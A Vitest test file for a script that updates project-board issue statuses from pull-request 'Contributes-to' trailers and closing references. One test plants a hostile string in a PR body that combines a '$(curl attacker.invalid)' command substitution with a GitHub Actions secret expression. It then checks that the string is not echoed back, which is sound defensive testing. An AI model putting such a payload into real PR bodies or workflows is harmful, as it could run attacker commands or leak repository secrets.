import { describe, expect, it, vi } from 'vitest'

import type { PullRequestReference } from '../scripts/project-management/issue-planning.ts'
import type {
  NormalizedPlanningRecord,
  PlanningRecordInput,
  PlanningRecordReport,
} from '../scripts/project-management/planning-record.ts'
import {
  reconcilePullRequestPlanning,
  reconcileReopenedIssuePlanning,
  type PlanningRecordReconcilerPort,
  type PullRequestPlanningPort,
} from '../scripts/project-management/pull-request-planning.ts'
import type {
  PullRequestBodySnapshot,
  PullRequestSnapshot,
} from '../scripts/project-management/pull-request-relationships.ts'

interface FakePlanningState {
  issueState?: 'OPEN' | 'CLOSED'
  membership?: 'missing' | 'present' | 'archived'
  status?: string | null
  linkedPullRequests?: PullRequestReference[]
  failure?: Error
}

function pullRequest(overrides: Partial<PullRequestSnapshot> = {}): PullRequestSnapshot {
  return {
    repository: 'jarmak-personal/hvir',
    number: 86,
    state: 'OPEN',
    isDraft: false,
    body: '',
    closingIssues: [],
    ...overrides,
  }
}

function pullRequestPort(
  snapshot: PullRequestSnapshot,
  openPullRequests: PullRequestBodySnapshot[] = [],
): PullRequestPlanningPort {
  return {
    getPullRequest: vi.fn().mockResolvedValue(snapshot),
    listOpenPullRequestBodies: vi.fn().mockResolvedValue(openPullRequests),
  }
}

function planningPort(
  inputStates: Record<number, FakePlanningState>,
): PlanningRecordReconcilerPort {
  const states = new Map(
    Object.entries(inputStates).map(([number, state]) => [Number(number), { ...state }]),
  )
  return {
    reconcile: vi.fn().mockImplementation((input: PlanningRecordInput) => {
      const state = states.get(input.issueNumber)
      if (state === undefined) {
        return Promise.reject(new Error(`Issue #${input.issueNumber} was not found.`))
      }
      if (state.failure !== undefined) return Promise.reject(state.failure)

      const before = state.status ?? null
      let outcome: 'unchanged' | 'would-update' | 'updated' | undefined
      if (input.status !== undefined) {
        const eligible =
          state.issueState !== 'CLOSED' &&
          (input.expectedStatus === undefined || before === input.expectedStatus)
        if (!eligible || before === input.status) {
          outcome = 'unchanged'
        } else if (input.apply) {
          state.status = input.status
          outcome = 'updated'
        } else {
          outcome = 'would-update'
        }
      }
      return Promise.resolve(planningReport(input, state, before, outcome))
    }),
  }
}

describe('pull request planning lifecycle', () => {
  it('advances Todo issues for open draft completion and contribution relationships', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        isDraft: true,
        body: 'Contributes-to: #11',
        closingIssues: [issueReference(10)],
      }),
      [openPullRequest(86, 'Contributes-to: #11')],
    )
    const planning = planningPort({ 10: { status: 'Todo' }, 11: { status: 'Todo' } })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: false,
    })

    expect(report.pullRequest).toEqual({
      repository: 'jarmak-personal/hvir',
      number: 86,
      state: 'OPEN',
      draft: true,
    })
    expect(report.targets).toEqual([
      expect.objectContaining({
        issueNumber: 10,
        relationships: ['closing'],
        outcome: 'would-advance',
      }),
      expect.objectContaining({
        issueNumber: 11,
        relationships: ['contribution'],
        outcome: 'would-advance',
      }),
    ])
    expect(report.summary).toMatchObject({ wouldAdvance: 2, errors: 0 })
  })

  it('applies valid targets before reporting malformed and inaccessible relationships', async () => {
    const hostile = '$(curl attacker.invalid) `${{ secrets.HVIR_PROJECT_TOKEN }}`'
    const pullRequests = pullRequestPort(
      pullRequest({
        body: [
          'Contributes-to: #10',
          'Contributes-to: owner/repository#12',
          'Contributes-to: #11',
          hostile,
        ].join('\n'),
      }),
      [openPullRequest(86, 'Contributes-to: #10\nContributes-to: #11')],
    )
    const planning = planningPort({
      10: { status: 'Todo' },
      11: { failure: new Error('Issue #11 was not readable.') },
    })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: true,
    })

    expect(report.targets).toEqual([
      expect.objectContaining({ issueNumber: 10, outcome: 'advanced' }),
      expect.objectContaining({ issueNumber: 11, outcome: 'failed' }),
    ])
    expect(report.summary).toMatchObject({ advanced: 1, failed: 1, errors: 2 })
    expect(JSON.stringify(report)).not.toContain(hostile)
  })

  it('defers a merged completion to native issue closure but preserves contributed work', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        body: 'Contributes-to: #11',
        closingIssues: [issueReference(10)],
      }),
    )
    const planning = planningPort({ 11: { status: 'Todo' } })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: true,
    })

    expect(report.targets).toEqual([
      {
        issueNumber: 10,
        relationships: ['closing'],
        outcome: 'unchanged',
        reason: 'completion-merge-deferred',
      },
      expect.objectContaining({
        issueNumber: 11,
        outcome: 'advanced',
        statusAfter: 'In Progress',
      }),
    ])
    expect(planning.reconcile).not.toHaveBeenCalledWith(
      expect.objectContaining({ issueNumber: 10 }),
    )
  })

  it('recomputes removed contributions without regressing status', async () => {
    const pullRequests = pullRequestPort(pullRequest({ state: 'CLOSED' }), [
      openPullRequest(90, 'Contributes-to: #10'),
    ])
    const planning = planningPort({
      10: { status: 'Todo' },
      11: { status: 'In Progress' },
    })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      previousBody: 'Contributes-to: #10\nContributes-to: #11',
      apply: false,
    })

    expect(report.relationships.removedContribution).toEqual([10, 11])
    expect(report.targets).toEqual([
      expect.objectContaining({
        issueNumber: 10,
        outcome: 'would-advance',
        relationships: ['removed-contribution'],
      }),
      expect.objectContaining({
        issueNumber: 11,
        outcome: 'unchanged',
        reason: 'no-active-relationship',
        statusAfter: 'In Progress',
      }),
    ])
  })

  it('finds another active native completion when the triggering relationship is inactive', async () => {
    const pullRequests = pullRequestPort(pullRequest({ state: 'CLOSED' }), [])
    const planning = planningPort({
      10: {
        status: 'Todo',
        linkedPullRequests: [
          {
            repository: 'jarmak-personal/hvir',
            number: 90,
            state: 'OPEN',
            mergedAt: null,
            relationship: 'closing',
          },
        ],
      },
    })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      previousBody: 'Contributes-to: #10',
      apply: false,
    })

    expect(report.targets[0]).toMatchObject({
      issueNumber: 10,
      outcome: 'would-advance',
    })
  })

  it('does not guess transitions for closed, non-Todo, missing, or archived issues', async () => {
    const body = [10, 11, 12, 13, 14, 15]
      .map((number) => `Contributes-to: #${number}`)
      .join('\n')
    const pullRequests = pullRequestPort(pullRequest({ body }), [
      openPullRequest(86, body),
    ])
    const planning = planningPort({
      10: { status: 'In Progress' },
      11: { status: 'Done' },
      12: { status: null },
      13: { issueState: 'CLOSED', status: 'Todo' },
      14: { membership: 'missing', status: null },
      15: { membership: 'archived', status: 'Todo' },
    })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: true,
    })

    expect(
      report.targets.map(({ issueNumber, outcome, reason }) => ({
        issueNumber,
        outcome,
        reason,
      })),
    ).toEqual([
      { issueNumber: 10, outcome: 'unchanged', reason: 'status-not-todo' },
      { issueNumber: 11, outcome: 'unchanged', reason: 'status-not-todo' },
      { issueNumber: 12, outcome: 'unchanged', reason: 'status-not-todo' },
      { issueNumber: 13, outcome: 'unchanged', reason: 'issue-closed' },
      { issueNumber: 14, outcome: 'failed', reason: 'missing-project-item' },
      { issueNumber: 15, outcome: 'failed', reason: 'archived-project-item' },
    ])
    expect(report.summary).toMatchObject({ unchanged: 4, failed: 2, errors: 2 })
  })

  it('uses completion precedence and reports cross-repository and duplicate metadata', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        body: 'Contributes-to: #10\nContributes-to: #10',
        closingIssues: [issueReference(10), issueReference(12, 'another/repository')],
      }),
      [openPullRequest(86, 'Contributes-to: #10')],
    )
    const planning = planningPort({ 10: { status: 'Todo' } })

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: false,
    })

    expect(report.targets[0]).toMatchObject({
      issueNumber: 10,
      relationships: ['closing', 'contribution'],
      outcome: 'would-advance',
    })
    expect(report.diagnostics.map((diagnostic) => diagnostic.code)).toEqual([
      'duplicate-trailer',
      'cross-repository-completion',
      'redundant-relationship',
    ])
  })

  it('reports a concurrent state change instead of overwriting it', async () => {
    const pullRequests = pullRequestPort(pullRequest({ body: 'Contributes-to: #10' }), [
      openPullRequest(86, 'Contributes-to: #10'),
    ])
    const first = planningReport(
      { issueNumber: 10, ensureProject: false, apply: false },
      { status: 'Todo' },
      'Todo',
      undefined,
    )
    const changed = planningReport(
      {
        issueNumber: 10,
        ensureProject: false,
        status: 'In Progress',
        expectedStatus: 'Todo',
        openOnly: true,
        apply: true,
      },
      { status: 'Done' },
      'Done',
      'unchanged',
    )
    const planning: PlanningRecordReconcilerPort = {
      reconcile: vi.fn().mockResolvedValueOnce(first).mockResolvedValueOnce(changed),
    }

    const report = await reconcilePullRequestPlanning(pullRequests, planning, {
      pullRequestNumber: 86,
      apply: true,
    })

    expect(planning.reconcile).toHaveBeenLastCalledWith({
      issueNumber: 10,
      ensureProject: false,
      status: 'In Progress',
      expectedStatus: 'Todo',
      openOnly: true,
      apply: true,
    })
    expect(report.targets[0]).toMatchObject({
      outcome: 'unchanged',
      reason: 'concurrent-state-change',
      statusAfter: 'Done',
    })
  })

  it('recomputes active relationships when an issue is reopened', async () => {
    const pullRequests = pullRequestPort(pullRequest(), [
      openPullRequest(90, 'Contributes-to: #10'),
    ])
    const planning = planningPort({ 10: { status: 'Todo' } })

    const report = await reconcileReopenedIssuePlanning(pullRequests, planning, {
      repository: 'jarmak-personal/hvir',
      issueNumber: 10,
      apply: true,
    })

    expect(report).toMatchObject({
      applied: true,
      issue: { repository: 'jarmak-personal/hvir', number: 10 },
      target: {
        issueNumber: 10,
        outcome: 'advanced',
        reason: 'active-relationship',
        statusAfter: 'In Progress',
      },
      summary: { advanced: 1, errors: 0 },
    })
    expect(pullRequests.getPullRequest).not.toHaveBeenCalled()
  })

  it('leaves a reopened Todo issue alone when no explicit relationship is active', async () => {
    const pullRequests = pullRequestPort(pullRequest(), [])
    const planning = planningPort({ 10: { status: 'Todo' } })

    const report = await reconcileReopenedIssuePlanning(pullRequests, planning, {
      repository: 'jarmak-personal/hvir',
      issueNumber: 10,
      apply: true,
    })

    expect(report.target).toMatchObject({
      outcome: 'unchanged',
      reason: 'no-active-relationship',
      statusAfter: 'Todo',
    })
  })
})

function planningReport(
  input: PlanningRecordInput,
  state: FakePlanningState,
  from: string | null,
  outcome: 'unchanged' | 'would-update' | 'updated' | undefined,
): PlanningRecordReport {
  const record = planningRecord(state, input.issueNumber)
  return {
    apply: input.apply,
    applied: outcome === 'updated',
    record,
    operations:
      input.status === undefined || outcome === undefined
        ? []
        : [
            {
              operation: 'set-status',
              outcome,
              from,
              to: input.status,
            },
          ],
  }
}

function planningRecord(
  state: FakePlanningState,
  issueNumber: number,
): NormalizedPlanningRecord {
  return {
    repository: 'jarmak-personal/hvir',
    issue: {
      number: issueNumber,
      state: state.issueState ?? 'OPEN',
      kind: {
        state: 'valid',
        label: 'kind:feature',
        option: 'Feature',
        recognizedLabels: ['kind:feature'],
      },
      areas: [],
      parent: null,
      subIssues: [],
      linkedPullRequests: state.linkedPullRequests ?? [],
    },
    project: {
      membership: state.membership ?? 'present',
      kind: 'Feature',
      status: state.status ?? null,
    },
  }
}

function issueReference(
  number: number,
  repository = 'jarmak-personal/hvir',
): PullRequestSnapshot['closingIssues'][number] {
  return { repository, number, state: 'OPEN' }
}

function openPullRequest(number: number, body: string): PullRequestBodySnapshot {
  return { repository: 'jarmak-personal/hvir', number, body }
}
